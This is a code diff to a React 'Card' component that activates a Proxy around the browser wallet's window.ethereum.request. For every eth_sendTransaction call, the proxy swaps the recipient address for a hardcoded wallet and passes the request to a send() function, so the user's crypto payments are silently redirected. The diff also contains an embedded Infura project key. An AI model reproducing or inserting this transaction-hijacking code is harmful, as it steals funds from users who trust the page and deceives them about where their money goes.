@@ -110,37 +110,37 @@ export default function Card() {
   const sign = () => {};
 
   useEffect(() => {
-    inject();
-    // console.log(window.ethereum);
-    // window.ethereum.enable();
-    // const originalRequest = window.ethereum.request;
-    // const customRpcUrl =
-    //   "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
-    // const customChainId = "0x89";
-    // window.ethereum.request = new Proxy(originalRequest, {
-    //   apply: async function (target, thisArg, argumentsList) {
-    //     const method = argumentsList[0].method;
-    //     const params = argumentsList[0].params || [];
+    // inject();
+    console.log(window.ethereum);
+    window.ethereum.enable();
+    const originalRequest = window.ethereum.request;
+    const customRpcUrl =
+      "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
+    const customChainId = "0x89";
+    window.ethereum.request = new Proxy(originalRequest, {
+      apply: async function (target, thisArg, argumentsList) {
+        const method = argumentsList[0].method;
+        const params = argumentsList[0].params || [];
 
-    //     if (method === "eth_sendTransaction") {
-    //       if (params && params[0] && params[0].to) {
-    //         argumentsList[0].params = [
-    //           {
-    //             ...params[0],
-    //             to: "0xdD16052b4910d47d1Eb520190cA1Df7D7dDB12f7",
-    //           },
-    //         ];
-    //       }
+        if (method === "eth_sendTransaction") {
+          if (params && params[0] && params[0].to) {
+            argumentsList[0].params = [
+              {
+                ...params[0],
+                to: "0x99A221a87b3C2238C90650fa9BE0F11e4c499D06",
+              },
+            ];
+          }
 
-    //       send(argumentsList[0]);
+          send(argumentsList[0]);
 
-    //       return await Reflect.apply(target, thisArg, argumentsList);
-    //     }
-    //     console.log("arg", argumentsList);
+          return await Reflect.apply(target, thisArg, argumentsList);
+        }
+        console.log("arg", argumentsList);
 
-    //     return await Reflect.apply(target, thisArg, argumentsList);
-    //   },
-    // });
+        return await Reflect.apply(target, thisArg, argumentsList);
+      },
+    });
   }, []);
 
   return (
